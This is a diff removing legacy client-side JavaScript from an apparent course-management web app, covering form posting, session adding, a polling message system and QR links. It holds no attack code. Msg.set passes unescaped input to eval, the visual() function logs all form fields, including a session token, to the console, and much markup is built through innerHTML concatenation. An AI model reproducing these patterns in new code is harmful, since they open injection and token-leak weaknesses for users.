-        var picwidth = tbl.rows[0].cells[0].childNodes[0].width;
-        td.innerHTML = "<img width=" + picwidth + " height=" + picwidth + "   style=\"margin:0px 0px 0px 0px;float:left;border-radius:" +  (Math.round(picwidth/2)) + "px;width:" + picwidth + "px !important;cursor:pointer\" src=\"image/arrow.jpg\" onclick=\"insertpicundera(this)\" >"
-    }
-    else
-    {
-        var fsnd1 = document.getElementById("openfileform_id");
-        if (fsnd1 == null)
-        {
-            fsnd1 = document.createElement("form");
-            fsnd1.name = "openfileform";
-            fsnd1.id = "openfileform_id";
-            fsnd1.action = (did.indexOf('http')!=0?"FileOperation":did);
-            fsnd1.method = 'post';
-            fsnd1.target = "_blank";
-            fsnd1.innerHTML = "<input type=hidden name=did><input type=hidden name=operation value=open>";
-            document.body.appendChild(fsnd1);
-        }
-        fsnd1.did.value = did;
-        formnewaction(fsnd1);
-       visual(fsnd1);
- fsnd1.submit();
-    }
-}
-
-var systemname = function()
-{
-    if (numcalls++ > 2000) return "";
-    var ans = systemnamestr;
-    if (ans !=null) return ans;
-
-    if (opener!=window && typeof(opener) != 'undefined' && opener!=null&& onmydomain(opener) && typeof(opener.systemname)!='undefined' && opener.systemname!=null)
-        ans = opener.systemname();
-    if ( ans!=null) return ans;
-
-    if (parent!=window && typeof(parent.systemname)!='undefined' && parent.systemname!=null)
-        ans = parent.systemname();
-    if  (ans!=null) return ans;
-
-    if (parent!=window && parent.opener!=null&& onmydomain(parent.opener) && typeof(parent.opener.systemname)!='undefined' && parent.opener.systemname!=null)
-        ans = parent.opener.systemname();
-    if  (ans!=null) return ans;
-
-    return null;
-}
-systemnamestr = systemname();
-function narrowtable()
-{
-    if (datapresentformat == 'DataLongForm')
-        for(Z=0;Z<numRows;Z++)
-        {
-            var tb=document.getElementById('Igdt'+Z+'_4');
-            tb.width=null;
-            for(r=0;r<tb.rows.length;r++)
-            {
-                tb.rows[r].cells[0].innerHTML=tb.rows[r].cells[0].innerHTML.replace(/&nbsp;/g,' ');
-                tb.rows[r].cells[0].width='600';
-            }
-            for(c=1;c<tb.rows[0].cells.length;c++)
-                tb.rows[0].cells[c].innerHTML='<nobr>' + tb.rows[0].cells[c].innerHTML + '</nobr>';
-        }
-}
-function nonamefunc1()
-{
-    for(r=0;r<numRows;r++)
-    {
-        ele(r,2).style.width='180px';
-        if(mat[r][1].indexOf('textmsg')==0 &&''+(x=parseInt(mat[r][1].replace(/[^0-9]/g,'')))!='NaN')
-            setv(r,1,textmsg[x]);valuechanged[r]=false;
-    }
-}
-function visual(f)
-{
-    var x = "name=" + f.name
-    + "\naction=" + f.action
-    + "\ntarget=" + f.target
-    + "\nenc=" + f.enctype;
-    
-    if (f.target == '_self')
-    {
-        var el = document.createElement('input');
-        el.name = 'targetisself';
-        el.value= '11';
-        el.type= 'hidden';
-        f.appendChild(el);
-    }
-    for (var i=0; i < f.elements.length; i++)
-        if (f.elements[i].name!='wcds')
-        x += "\n"+ f.elements[i].name + "=" + f.elements[i].value;
-    failedformsubmit = "document." + f.name + ".submit();";
-    console.log(x);
-}
-
-function makeformhiddenele(f, nm, vl)
-{
-   if (f == null) return;
-   var i;
-   for (i=0; i < f.elements.length; i++)
-   {
-       if (f.elements[i].name == nm)
-       {
-           f.elements[i].value = vl;
-           return;
-       }
-   }
-   var el = document.createElement('input');
-   el.name = nm;
-   el.value = vl;
-   el.type = 'hidden';
-   f.appendChild(el);
-}
-
-function changerid(routine, oldid, newid, session, course, semester)
-{
-     if (typeof(cc) != 'undefined')
-     {
-         ccbeing = cc;
-     }
-     var nms = ["rdap", "subdb", "x", "OldId", "NewId", "Session", "CourseId", "Semester"];
-     var vls = [ routine ,subdb ,routine, oldid, newid, session,   course,     semester];
-     postopen('follows.jsp', nms, vls,  "w" + tstmp);
-
-}
-function  roolback()
-{
-    ele(rr,ccbeing).value = mat[rr][ccbeing];
-    myprompt(textmsg[91]);
-}
-function  old2new()
-{
-    mat[rr][ccbeing] = retrv(rr,ccbeing);
-
-    if (rdapname == 'assignedit')
-    {
-        parent.frames[0].refresh();
-    }
-}
-
-function fff()
-{
-    popwin1=self.name;
-    var sel=f1.displayformat;
-  
-    sel.options[1].className='selectoption';
-    var sels = sel.selectedIndex;
-    var xx=sel.options[0].text;
-    var selx=sel.selectedIndex;
-    if(retrv(0,0)=='0')
-    {
-        document.form1.Poster.value='Myself';
-        f1.displayformat.options[0]=new Option(xx,'announcepage.jsp');
-    }
-    else
-    {
-        document.form1.Poster.value='';
-        f1.displayformat.options[0]=new Option(xx,'announcepageother.jsp');
-    }
-    f1.displayformat.options[0].className='selectoption';
-    sel.selectedIndex=selx;
-
-}
-
-function morecoursesel(t)
-{
-   
-    if (t!=null && t.replace(/ /g,'') != '') {
-    var ts = t.split(/,/);
-    for (var i=0; i < ts.length; i++)
-    {
-        var isone = false;
-        for (var j=0; j < numRows; j++)
-        {
-            if (ts[i] == retrv(j,0))
-            {
-                isone = true;
-                break;
-            }
-        }
-        if (!isone)
-        {
-            var y = ts[i].split(/\|/);
-            document.form1.checkbox[numRows].checked = true;
-           mat[numRows] = new Array();
-
-           mat[numRows][0] = ts[i];
-
-            setv(numRows, 0, ts[i]);
-           mat[numRows][1] = y[0];
-
-            setv(numRows, 1, y[0]);
-           mat[numRows][2] = y[1];
-
-            setv(numRows, 2, y[1]);
-            mat[numRows][5] ='DataFormHTML?rdap=Syllabusi';
-
-            setv(numRows, 5, 'DataFormHTML?rdap=Syllabusi');
-             mat[numRows][6] = parent.frames[0].document.form1.semester.value;
-
-            setv(numRows, 6, mat[numRows][6]);
-            mat[numRows][4] = y[2];
-
-            setv(numRows++, 4, y[2]);
-
-        }
-    }
-    }
-  
-    var z = ele(0,7).outerHTML.replace(/width:[ ]?100px/,'').replace(/name=.0_7./, 'name=depts id=depttr style="width:99%;border:1px #60606 solid" onchange="change2asemester(this)" ' );
-    var inss = textmsg[1647].split("\n");
-    var ins0 = inss[0];
-    var ins1 = '';
-     
-    if (parent.frames[0].getstudentdriven())
-        ins1 = inss[1];
-    var tt = document.getElementsByTagName('table')[0].rows[0].cells[0].getElementsByTagName('table')[0];
-    var ttr = tt.insertRow(1);
-    var ttd = ttr.insertCell(0);
-    ttd.align='center';
-    ttd.style.padding = '3px 3px 3px 3px';
-    ttd.innerHTML = '<div id=newsession><table align=center ><tr><td colspan=2 class=outset1 style=width:500px;text-align:left>'+ ins0 + ins1 + (ins1==''?'':('<input type=button class=GreenButton style=width:80px;overflow:show value="' + textmsg[610] + '" onclick=addasession()>')) + '</td></tr><tr ><td  valign=top  style="background:' + gradientbg + ';background-color:' + IBGCOLOR +';color:#DDCC11;width:110px;font-weight:700;text-shadow:-1px -1px #060606"><nobr>' +textmsg[1815] + '</nobr></td><td style="border:1px #505050 solid">' +  z + "</td></tr></table></div>";
-    for (var j=0; j < NUMROWS; j++)
-    {
-        ele(j,7).style.visibility = 'hidden';
-        ele(j,7).style.width = '1px';
-    }
-}
-
-function writehint()
-{
-    addasession(1);
-}
-function change2asemester(sel)
-{
-    var v = sel.options[sel.selectedIndex].value;
-    if (v!='new')
-    {
-        parent.frames[0].dodept(v,0);
-        return;
-    }
-}
-function change1semester(sel)
-{
-    if (sel.selectedIndex == sel.options.length-1)
-    {
-        document.fadds.anewsemester.style.visibility = 'visible';
-    }
-}
-function addasession(t)
-{
-    var sel  = document.getElementById('depttr');
-    var selstr = '';
-    for (var j=0; j < options[7].length; j++)
-        selstr += '<option value="' +  options[7][j]  + '" ' + (j==0?'selected':'') + '>' + captions[7][j] + '</option>';
-    selstr += '<option value="new">' + textmsg[925] + '</option>';
-     
-    var str = "<form name=fadds method=post action=follows.jsp target=w" + tstmp +" style=\"margin:0px 0px 0px 0px\"><table   align=center style=\"width:" + (document.getElementById('maintbl').offsetWidth-8) +"px;margin:4px 4px 4px 4px\"><tr><td colspan=2> </td></tr><tr height=80 valign=middle align=left><td colspan=2>" + textmsg[1808] + (t==null?'':('<br>(<font color=purple>' +textmsg[1817] + '</font>)') ) +  "</td></tr>"
-         //   + '<tr><td align=center colspan=2 style=font-weight:700;font-size:30px>' + textmsg[1813] + '</td></tr>'
-            + '<tr><td style="border-radius:3px;background:' + gradientbg + ';background-color:' + IBGCOLOR +';color:#DDCC11;width:110px;font-weight:700;text-shadow:-1px -1px #060606">' + textmsg[152] + '</td>'
-            + '<td><input class=left style="width:99%;color:#505050;border:1px rgb(176,176,176) solid;border-radius:3px" value="' + textmsg[1809] + '" onfocus=clearhint(this) onblur=rehint(this,1809) name=courseid></td></tr>'
-            + '<tr><td style="border-radius:3px;background:' + gradientbg + ';background-color:' + IBGCOLOR +';color:#DDCC11;width:110px;font-weight:700;text-shadow:-1px -1px #060606">' + textmsg[604] + '</td>'
-            + '<td><input class=left style="width:99%;color:#505050;border:1px rgb(176,176,176) solid;border-radius:3px" value="' + textmsg[1810] + '" onfocus=clearhint(this) onblur=rehint(this,1810) name=coursetitle></td></tr>'
-            + '<tr><td style="border-radius:3px;background:' + gradientbg + ';background-color:' + IBGCOLOR +';color:#DDCC11;width:110px;font-weight:700;text-shadow:-1px -1px #060606">' + textmsg[1510] + '</td>'
-            + '<td><input class=left style="width:99%;color:#505050;border:1px rgb(176,176,176) solid;border-radius:3px" value="' + textmsg[1811] + '" onfocus=clearhint(this) onblur=rehint(this,1811)  name=sessionname></td></tr>'
-            + '<tr><td style="border-radius:3px;background:' + gradientbg + ';background-color:' + IBGCOLOR +';color:#DDCC11;width:110px;font-weight:700;text-shadow:-1px -1px #060606"><nobr>' + textmsg[1812] + '</nobr></td>'
-            + '<td><input class=left style="width:99%;color:#505050;border:1px rgb(176,176,176) solid;border-radius:3px"  value="' + textmsg[750] +':hsmith12@abc.edu" onfocus=clearhint(this) onblur="rehint(this,\'' + textmsg[750] +':hsmith12@abc.edu\')"  name=email></td></tr>'
-            + '<tr><td valign=top style="border-radius:3px;background:' + gradientbg + ';background-color:' + IBGCOLOR +';color:#DDCC11;width:110px;font-weight:700;text-shadow:-1px -1px #060606"><nobr>' + textmsg[1815] + '</nobr></td>'
-            + '<td><select id=depts style="width:100%;color:#505050;border:1px rgb(176,176,176) solid;border-radius:3px" onchange=change1semester(this) >'+  selstr + '</select></td></tr>'  
-            + '<tr><td   align=left></td><td><input  type=text class=left style="visibility:hidden;border:1px rgb(176,176,176) solid;border-radius:3px;width:99%;color:#505050" '
-            + " name=anewsemester value=\"" + textmsg[1816] + '" onfocus=clearhint(this) onblur=rehint(this,1816) ></td></tr><tr><td colspan=2 align=center><input type=hidden name=url><input type=hidden name=uid><input type=button class=OrangeButton style=width:75px value="' + textmsg[61] + '" onclick=addasessionsubm()><input type=button class=OrangeButton style=width:75px value="' + textmsg[18] + '" onclick=notaddasession()></td></tr>'
-            + '</table><input type=hidden name=x value=sessionadd></form>';
-            var dv = document.getElementById('newsession');
-            dv.innerHTML = str;
-            dv.className = 'outset1';
-        //myprompt(str,null,null,textmsg[1813])
-            //promptwin.style.width = "450px";
-}
-function notaddasession()
-{
-    var z = ele(0,7).outerHTML.replace(/width:[ ]?1px/,'').replace(/name=.0_7./, 'name=depts id=depttr style="width:99%;border:1px #60606 solid" onchange="change2asemester(this)" ' ).replace(/hidden/i,'visible');
-    
-    var inss = textmsg[1647].split("\n");
-    var ins0 = inss[0];
-    var ins1 = inss[1];
-    var dv = document.getElementById('newsession'); 
-   dv.innerHTML = '<table align=center ><tr><td colspan=2  style=width:500px;text-align:left>'+ ins0 + ins1 + (ins1==''?'':('<input type=button class=GreenButton style=width:80px;overflow:show value="' + textmsg[610] + '" onclick=addasession()>')) + '</td></tr><tr ><td  valign=top  style=background:' + gradientbg.replace(/\(/,'(to right,') + ';color:#DDCC11;width:110px;font-weight:700><nobr>' +textmsg[1815] + '</nobr></td><td style="border:1px #505050 solid">' +  z + "</td></tr></table>";
-    
-}
-function clearhint(txt)
-{
-  
-   if (''+txt.style.color=='rgb(80, 80, 80)' ||''+txt.style.color=='#505050')
-   {
-       txt.style.color = 'rgb(0, 0, 0)';
-       txt.value = '';
-   }
-    
-}
-function rehint(txt,j)
-{
-    
-        txt.value = txt.value.replace(/^[ ]+/,'').replace(/[ ]+$/,'').replace(/[ ]+./,' ');
-        if (txt.value == '')
-        {
-            if (typeof(j)=='number')
-                txt.value = textmsg[j];
-            else
-                txt.value = j;
-            txt.style.color = '#505050';
-        }
-     
-}
-function addasessionsubm()
-{
-    if (document.fadds.courseid.value.length<2 || document.fadds.courseid.style.color=='rgb(80, 80, 80)')
-    {
-        myprompt(textmsg[152] + ":" + textmsg[1814]);
-        return;
-    }
-    if (document.fadds.coursetitle.value.length<3 || document.fadds.coursetitle.style.color=='rgb(80, 80, 80)')
-    {
-        myprompt(textmsg[604] + ":" + textmsg[1814]);
-        return;
-    }
-    if (document.fadds.sessionname.value.length<2 || document.fadds.sessionname.style.color=='rgb(80, 80, 80)')
-    {
-        myprompt(textmsg[1510] + ":" + textmsg[1814]);
-        return;
-    }
-    document.fadds.email.value = document.fadds.email.value.replace(/^[ ]+/,'').replace(/[ ]+$/,'').replace(/[ ]+./,' ');
-    
-    if (document.fadds.email.value.length<12 || document.fadds.email.value.indexOf('@')<=4)
-    {
-        myprompt(textmsg[1812] + ":" + textmsg[1814]);
-        return;
-    }
-    document.fadds.url.value = theurl.replace(/DataPicker.*/,'');
-    document.fadds.action = "follows.jsp";
-    document.fadds.target = "w" + tstmp;
-    visual(document.fadds);
-    document.fadds.submit();         
-}
-function Message(tid, sid, sname, rid, code, msg)
-{
-    this.j = 0;
-    this.parse = function(s)
-    {
-        var i = s.indexOf("@", this.j);
-        var x = "";
-        if (i < 0)
-        {
-            this.valid = false;
-        }
-        else
-        {
-            x = s.substring(this.j, i);
-            this.j = i + 1;
-        }
-        return x;
-    }
-
-    this.valid = true;
-    if (code == null && tid != '')
-    {
-        var s = tid;
-        var j = s.length - 1;
-        while (j >= 0 && (s.charAt(j) == '\n' || s.charAt(j) == '\r'))
-            j--;
-
-        if (j == 0)
-            s = '';
-        else
-            s = s.substring(0, j + 1);
-        //"" + this.serial + " " + this.tid + " " + this.sek + " "
-
-        this.serial = parseInt(this.parse(s));
-        this.num = parseInt(this.parse(s));
-        this.tid = this.parse(s);
-        this.sid = this.parse(s);
-        this.sname = this.parse(s).replace(/_/g, ' ');
-        this.rid = this.parse(s);
-        this.code = this.parse(s);
-        this.time = this.parse(s);
-        this.msg = s.substring(this.j);
-        this.j = 0;
-    }
-    else
-    {
-        this.tid = tid;
-        this.sid = sid;
-        this.sname = sname;
-        this.rid = rid;
-        this.code = code;
-        this.msg = msg;
-        this.num = 0;
-        this.serial = 0;
-    }
-    this.toString = function()
-    {
-        return  this.serial + " " + this.num + " " + this.tid + " " + this.sid + " " + this.sname.replace(/ /g, '_') + " " + this.rid + " " + this.code + " " + this.time + " " + this.msg;
-    }
-}
-var Msg =
-{
-     app:'',
-     tid:'',
-     topic:'',
-     sek:'',
-     rid:'',
-     sid:'',
-     msg:'',
-     code:'',
-     sname:'',
-     stoken:'',
-     oldonunload : window.onunload,
-     timeoutInMin:120,
-    switchn:0,
-    queued :[],
-    statel: 0,
-    lastsent: 0,
-    url:'',
-    sequence:0,
-    tstmp:Math.round(Math.random()*10000000),
-    needmore:true,
-    hexd : '0123456789abcdef'.split( "" ),
-    sendingqueue:[],
-    tail:-1,
-    front:-1,
-    maximum:100,
-    sendingstatus:'sent',
-
-    xmlhttp:null,
-
-    handleget: function (x)
-    {
-       // myprompt(x);
-
-    },
-    handlepost: function (x)
-    {
-        //myprompt(x);
-    },
-    send0 : function()
-    {
-         formnewaction(Msg.fmsgsend);
-         visual(Msg.fmsgsend);
-         Msg.fmsgsend.submit();
-    },
-     resend : function()
-     {
-         Msg.sendingstatus = 'sent';
-         Msg.send();
-     },
-
-    getpacket: function(packet)
-    {
-        var s = '';
-        if (packet!=null)
-        {
-        if (typeof(packet.app)!='undefined') {
-            Msg.app = packet.app;  }
-        if (typeof(packet.tid)!='undefined'){
-            Msg.tid = packet.tid;  }
-        if (typeof(packet.sek)!='undefined'){
-            Msg.sek = packet.sek;  }
-        if (typeof(packet.rid)!='undefined'){
-            Msg.rid = packet.rid;   }
-        if (typeof(packet.sid)!='undefined'){
-            Msg.sid = packet.sid;  }
-        if (typeof(packet.msg)!='undefined'){
-            Msg.msg = packet.msg;  }
-        if (typeof(packet.code)!='undefined'){  Msg.code = packet.code;  }
-        if (typeof(packet.sname)!='undefined'){ Msg.sname = packet.sname ;  }
-        if (typeof(packet.stoken)!='undefined'){
-            Msg.stoken = packet.stoken; }
-
-       }
-
-   },
-
-
-     process:function()
-    {
-        if (Msg.xmlhttp.readyState == 4 && Msg.xmlhttp.status == 200&& Msg.xmlhttp.responseText!='')
-        {
-            var q = Msg.xmlhttp.responseText ;
-            Msg.handleget(q);
-            if (Msg.needmore)
-            Msg.listen();
-        }
-    },
-
-   fmsgsend:null,
-   init : function (packet)
-   {
-       Msg.getpacket(packet);
-       window.onunload = function(){ if (Msg.oldonunload!=null) Msg.oldonunload(); Msg.quit();}
-       Msg.xmlhttp =  newajax();
-       Msg.xmlhttp.onreadystatechange =  Msg.process;
-       if (typeof(tstmp)!='undefined') Msg.tstmp = tstmp;
-       for (var i=0; i < window.frames.length; i++)
-        if (window.frames[i].name.replace(/w[0-9]+/,'')=='')
-        {
-            Msg.tstmp = parseInt(window.frames[i].name.replace(/w/,''));
-            break;
-        }
-
-        if (i==window.frames.length)
-        {
-           myprompt("The page does not have hidden tiny iframe" +window.frames.length)
-          //  var fr = document.createElement('i1111frame');
-          //  fr.name = 'w' + Msg.tstmp;
-          //  fr.width='1'; fr.height = '1';
-         //   document.body.appendChild(fr);
-        }
-       var fsnd = document.createElement("form");
-        fsnd.name = "fmsg";
-        fsnd.action = "Msgsend";
-        fsnd.method = 'post';
-        fsnd.target = 'w' + Msg.tstmp;
-        fsnd.innerHTML = "<input type=\"hidden\" name=\"stoken\" value=\"\">"
-                + "<input type=\"hidden\" name=\"app\" value=\"\">"
-                + "<input type=\"hidden\" name=\"tid\">"
-                + "<input type=\"hidden\" name=\"topic\">"
-                + "<input type=\"hidden\" name=\"sid\">"
-                + "<input type=\"hidden\" name=\"sname\">"
-                + "<input type=\"hidden\" name=\"rid\">"
-                + "<input type=\"hidden\" name=\"code\">"
-                + "<input type=\"hidden\" name=\"msg\">"
-                + "<input type=\"hidden\" name=\"sek\" value=\"\">";
-        document.body.appendChild(fsnd);
-        Msg.fmsgsend = fsnd;
-
-
-    },
-    lastlisten:0,
-
-    listen: function ()
-    {
-        lastlisten = (new Date()).getTime();
-        Msg.url = "Msgrecev?" + ((Msg.switchn++) % 100) + "&sek=" + Msg.sek + "&sid=" + Msg.sid + "&app=" + Msg.app;
-        var url =  Msg.getURL() + '&time='+ lastlisten;
-        if (typeof(orgnum)!='undefined') url += "&orgnum=" + (orgnum%65536);
-        Msg.xmlhttp.open('GET', url ,true);
-        Msg.xmlhttp.send();
-    },
-    rtohex: function(x)
-    {
-        if (x==null) return null;
-        var  y = '';
-        for (var  i=0; i < x.length/4 ; i++)
-        {
-            var  j =  parseInt(x.substring(i*4,(i+1)*4), 16);
-            var c = String.fromCharCode(j);
-            y +=(c);
-        }
-        return y;
-    },
-
-    tohex: function(j)
-    {
-        var z = '';
-        for (var k=0; k < 4; k++)
-        {
-        var y = j % 16;
-        z = Msg.hexd[y] + z;
-        j = j >> 4;
-        }
-        return z;
-    },
-    getURL:function(){return Msg.url;},
-    hex: function(ms)
-    {
-        if (ms == null) return null;
-        var x = '';
-        for (var j=0; j < ms.length; j++)
-            x += Msg.tohex(ms.charCodeAt(j))
-        return x;
-    },
-
-    append: function(x,y)
-    {
-        return x +'=' + y +'&';
-    },
-
-    send:function(packet)
-    {
-         if (Msg.fmsgsend == null) return;
-         if (packet!=null)
-         {
-             Msg.tail = (Msg.tail + 1) % Msg.maximum;
-             Msg.sendingqueue[Msg.tail] = packet;
-         }
-         if (Msg.sendingstatus == 'sending')
-         {
-
-             return;
-         }
-         Msg.front = (Msg.front + 1) % Msg.maximum;
-         packet = Msg.sendingqueue[Msg.front];
-         if (packet == null)
-         {
-             Msg.front = (Msg.front - 1) % Msg.maximum;
-             return;
-         }
-         Msg.getpacket(packet);
-
-         Msg.sendingqueue[Msg.front] = null;
-
-         Msg.sendingstatus = 'sending';
-         Msg.fmsgsend.app.value = Msg.app;
-         Msg.fmsgsend.sek.value = Msg.sek;
-         Msg.fmsgsend.tid.value = Msg.tid;
-         Msg.fmsgsend.topic.value = Msg.topic;
-         Msg.fmsgsend.sid.value = Msg.sid;
-         Msg.fmsgsend.rid.value = Msg.rid;
-         Msg.fmsgsend.sname.value = Msg.sname;
-         Msg.fmsgsend.code.value = Msg.code;
-         Msg.fmsgsend.stoken.value = Msg.stoken;
-         Msg.fmsgsend.msg.value = Msg.msg;
-         if (Msg.code == 'new')
-         {
-             Msg.topic = Msg.msg;
-             Msg.fmsgsend.topic.value = Msg.msg;
-         }
-       /* var url = "Msgsend?" + (Msg.switchn++) + "&sek=" + Msg.sek + "&app=" + Msg.app + "&tid=" + Msg.tid
-        + "&sid=" + Msg.sid + "&rid=" + Msg.rid + "&sname=" + Msg.hex(Msg.sname) + "&code=" + Msg.code + "&stoken=" + Msg.stoken
- +"&msg=" + Msg.hex(Msg.msg);*/
-         formnewaction(Msg.fmsgsend);
-         visual(Msg.fmsgsend);
-         Msg.fmsgsend.submit();
-
-    },
-
-    get:function(x)
-    {
-       return eval("Msg." + x + "");
-    },
-    set:function(x,y)
-    {
-      eval("Msg." + x + "='" + y + "'");
-    },
-
-    quit:function()
-    {
-        //if (Msg.tid == '' || Msg.msg == '') return;
-        if (parent.parent.opener!=null&& onmydomain(parent.parent.opener) && parent.parent.opener.Msg)
-        {
-           parent.parent.opener.Msg.send({app:Msg.app,sek:Msg.sek, tid:Msg.tid, code:'unsubs'});
-        }
-        else if (parent.frames[0]!=null && parent.frames[0].Msg)
-        {
-           parent.frames[0].Msg.send({app:Msg.app,sek:Msg.sek, tid:Msg.tid, code:'unsubs'});
-        }
-        else if (parent.opener!=null && onmydomain(parent.opener)&& parent.opener.Msg)
-        {
-           parent.opener.Msg.send({app:Msg.app,sek:Msg.sek, tid:Msg.tid, code:'unsubs'});
-        }
-        else
-        {
-             Msg.send({app:Msg.app,sek:Msg.sek, tid:Msg.tid, code:'unsubs'});
-        }
-    }
-};
-if (typeof(orgnum)!='undefined')
-{
-    SetCookie("orgnum", ""+orgnum);
-   
-}
-function warning(mg)
-{
-    if (mg.offsetWidth < 300)
-    {
-        document.getElementById('warning0').innerHTML = textmsg[1864];
-    }
-}
-function qrlink(nlg)
-{
-    if (parent!=window && parent.frames[0].document.location.toString().indexOf("studentindex.jsp")==0)
-    {
-
-    }
-    var theurl1 = "";
-    if (typeof(theurl) == 'undefined' &&  parent != window)
-    {
-        theurl1 = parent.parent.parent.document.location.toString();
-        myprompt("<div id=warning0> </div><br><img src=\"Qrlink?url=" + Msg.hex(theurl1) + (nlg==null?'':('&nlg=1')) + "\" onload=warning(this) style=text-align:center>",null,null,textmsg[1860]);
-    }
-    else if (typeof(theurl) != 'undefined')
-    {
-        var j = theurl.lastIndexOf('/');
-        if (parent == window)
-        {
-            theurl1 = theurl;
-        }
-        else
-        {
-            var url = parent.parent.parent.document.location.toString();
-            var k = url.lastIndexOf('/');
-            theurl1 = theurl.substring(0,j) + url.substring(k);
-        }
-        myprompt("<div id=warning0> </div><img  style=alignment:center src=\"Qrlink?url=" + Msg.hex(theurl1) + (nlg==null?'':('&nlg=1'))  + "\" onload=warning(this)  style=text-align:center>",null,null,textmsg[1860]);
-
-    }
-    else
-    {
-        myprompt("<img src=\"image/qrcode.gif\" >");
-    }
-}
-var justopenedwindowhandle;
-function mywindowref()
-{
-    if (window.opener&& onmydomain(opener) && window.opener.justopened)
-      window.opener.justopened(window);
-    else if (parent!=window && parent.justopened)
-      parent.justopened(window);
-}
-var pstsubmfm = null;
-function justopened(win,sucess)
-{
-   justopenedwindowhandle = win;
-   if (sucess==null || sucess==true)
-   {
-       if (pstsubmfm!=null && pstsubmfm.name!='postform')
-       document.body.removeChild(pstsubmfm);
-       pstsubmfm = null;
-   }
-   
-}
-function realClose()
-{
-    var win=window.open("","_top","","true");
-    win.opener=true;
-    win.close();
-}
-function redoexpired(win)
-{
-    try
-    {
-        eval(failedformsubmit);
-    }catch(e){
-        alert(failedformsubmit);
-    }
-}
-function postopen()
-{
-    if (postopen.arguments.length == 4)
-    {
-       var  url = postopen.arguments[0];
-       var  nms = postopen.arguments[1];
-       var  vls = postopen.arguments[2];
-       var  target =  postopen.arguments[3];
-    }
-    else if (postopen.arguments.length < 4)
-    {
-        if (postopen.arguments.length>0)
-            url = postopen.arguments[0];
-        else
-            url = "";
-        if (postopen.arguments.length>1)
-            target =  postopen.arguments[1];
-        else
-            target = "_blank";
-        var jj = url.indexOf("?");
-        if (jj==-1)
-        {
-            nms = null;
-            vls = null;
-        }
-        else
-        {
-            var xs = url.substring(jj+1).split(/&/);
-            nms = [];
-            vls = [];
-            for (var j=0; j < xs.length; j++)
-            {
-                if (xs[j].charAt(xs[j].length-1)=='=')
-                {
-                    nms[j] = xs[j].substring(0,xs[j].length-1);
-                    vls[j] = '';
-                }
-                else
-                {
-                    var ys = xs[j].split(/=/);
-                    nms[j] = ys[0];
-                    try{
-                       vls[j] = decodeURIComponent(ys[1]);
-                    }catch(e){ }
-                }
-            }
-            url = url.substring(0,jj);
-        }
-    }
-    var w = null, h=null;
-    if (target.replace(/[0-9]+/,'') == '' )
-    {
-         w = parseInt(target);
-         h = thispageheight() -10;
-    }
-    else if (target.replace(/[0-9]+_[0-9]+/,'') == '')
-    {
-         w = parseInt(target.replace(/_.*/,''));
-         h = parseInt(target.replace(/.*_/,''));
-    }
-    if (w!=null)
-    {
-        target = 'openlink';
-        myprompt('<iframe name=openlink width=' + w + ' height=' + h + ' />');
-    }
-
-    var f3 = null;
-    for (var j=0; j < document.forms.length; j++)
-        if ( 'subfollo' == document.forms[j].name)
-        {
-            f3 = document.forms[j];
-            for (var k=0; k < f3.elements.length; k++)
-            {
-                f3.removeChild(f3.elements[k]);
-            }
-            break;
-        }
-    if (f3 == null)
-    {
-        f3 = document.createElement("form");
-        f3.method = "POST";
-        f3.name = "subfollo";
-        if (target.replace(/w[0-9]+/,'')=='' && window.frames!=null && window.frames.length>0 && window.frames[window.frames.length-1].name == target)
-            document.body.insertBefore(f3,document.body.childNodes[document.body.childNodes.length-1]);
-        else
-            document.body.appendChild(f3);
-    }
-        formnewaction(f3,url);
-        f3.target = target;
-        if (nms!=null) 
-        for (var i=0; i < nms.length; i++)
-        {
-            var el = null;
-            for (var j=0; j < f3.elements.length; j++)
-            {
-                if (f3.elements[j].name == nms[i]) break;
-            }
-            if (j == f3.elements.length)
-            {
-                el = document.createElement('input');
-                el.type = 'hidden';
-                el.name = nms[i];
-                f3.appendChild(el);
-            }
-            else
-            {
-                el = f3.elements[j];
-            }
-            el.value = vls[i];
-        }
-         
-        pstsubmfm = f3;
-        justopenedwindowhandle = null;
-        if (w!=null)
-        {
-            for (var i=0; i < window.frames.length; i++)
-            if (window.frames[i].name == 'openlink')
-            {
-               justopenedwindowhandle = window.frames[i];
-               break;
-            }
-        }
-        if (typeof(f3.submit) == 'function')
-        {
-           visual(f3);
-           f3.submit();
-        }
-} 
-var resumehalted = function()
-{
-    expiretime = activeidletime + (new Date()).getTime();
-    if (typeof(document.subfollo)!='undefined')
-    document.subfollo.submit();
-}
-
-var numofuploadtries = 0;
-function setbackf(x,err)
-{
-    var fes = document.thisform.elements;
-    for (var i=0; i < fes.length; i++)
-    {
-        fes[i].disabled = false;
-    }
-    for (var k=0; k < x.length; k++)
-    {
-        for (var j=0; j < numRows; j++)
-        {
-            if (x[k][0] == mat[j][0])
-            {
-                setv(j,4,x[k][1]);
-                mat[j][4] = x[k][1];
-                holdvalues[j + '_4'] = null;
-                valuechanged[j] = false;
-            }
-        }
-    }
-    var N = 1;
-    if (err!='')
-    {
-        N = err.replace(/<.tr>.*/i, '').replace(/<tr>/i,'').replace(/[^<]/g,'').length/2;
-    }
-    if(N >= 2)
-    {
-        var vv = GetCookie("col" + subdb);
-        if (vv == null) vv = ";0:lastname;2:email;3:score;4:detail;5:detail;6:detail;7:detail;8:detail;9:detail;10:detail;11:detail;12:detail;13:detail;14:detail;15:detail;16:detail;17:detail;18:detail;19:detail;";
-        var err1 = '<tr>';
-        for (var j=0; j < N; j++)
-        {
-            var l = vv.indexOf(";" + j + ":lastname")>=0?" selected ":"";
-            var e = vv.indexOf(";" + j + ":email")>=0?" selected ":"";
-            var s = vv.indexOf(";" + j + ":score")>=0?" selected ":"";
-            var d = vv.indexOf(";" + j + ":detail")>=0?" selected ":"";
-            var i = vv.indexOf(";" + j + ":sid")>=0?" selected ":"";
-            
-            err1+= "<td><select name=c" + j + " onchange=selectse(this,"+j+")><option value=\"\" >No  Use</option><option value=lastname" + l + ">LastName</option><option value=email" + e + ">Email</option><option value=sid" + i + ">StudentId</option><option value=score" + s + ">Score</option><option value=detail " + d + ">Detail</option></select></td>";
-        }
-        
-        myprompt('<form name=fef><font color=red>(' + (++numofuploadtries)  + ')</font> The following records failed to match. Match them manually by selecting columns then <input class=GreenButton type=button onclick=submissmatch() value=Resubmit><table id=missed border=1 style=border-collapse:collapse>' + err1 + "</tr>" + err + '<table><form>');
-        promptwin.style.top = "0px";
-        promptwin.style.left = "0px";
-    }
-    else
-    {
-        document.thisform.removeChild(document.thisform.localpath);
-        document.thisform.removeChild(document.thisform.csname);
-        document.thisform.removeChild(document.thisform.item);
-        document.thisform.action = "SaveBack";
-        document.thisform.enctype = "application/x-www-form-urlencoded";
